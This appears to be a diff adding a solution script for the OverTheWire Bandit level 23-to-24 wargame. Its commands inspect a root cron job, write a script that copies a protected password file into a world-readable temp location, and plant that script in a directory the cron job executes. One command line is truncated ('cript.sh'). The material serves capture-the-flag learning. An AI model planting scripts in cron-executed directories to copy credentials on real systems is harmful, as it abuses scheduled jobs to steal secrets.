@@ -1,0 +1,18 @@
+# 1
+ls -la /etc/cron.d/
+cat /etc/cron.d/*24
+# 2
+ls -la /usr/bin/cronjob_bandit24.sh
+cat /usr/bin/cronjob_bandit24.sh
+# 3: Create a temp directory and enter it
+mktemp -d # dir_name = NynroZj7rw
+# 4: Create a script...
+#!/bin/bash
+cp /etc/bandit_pass/bandit24 /tmp/tmp.NynroZj7rw/pass
+chmod o+r /tmp/tmp.NynroZj7rw/pass
+# 5: Change permissions on NynroZj7rw directory to the cron job cans create a file with the password
+chmod o+wx /tmp/tmp.NynroZj7rw
+# 6: Copy the script into the cron script that executes the script each minute and then delete it
+cript.sh /var/spool/bandit24/foo/script.sh
+# 7: Finally retrieve the password
+cat pass
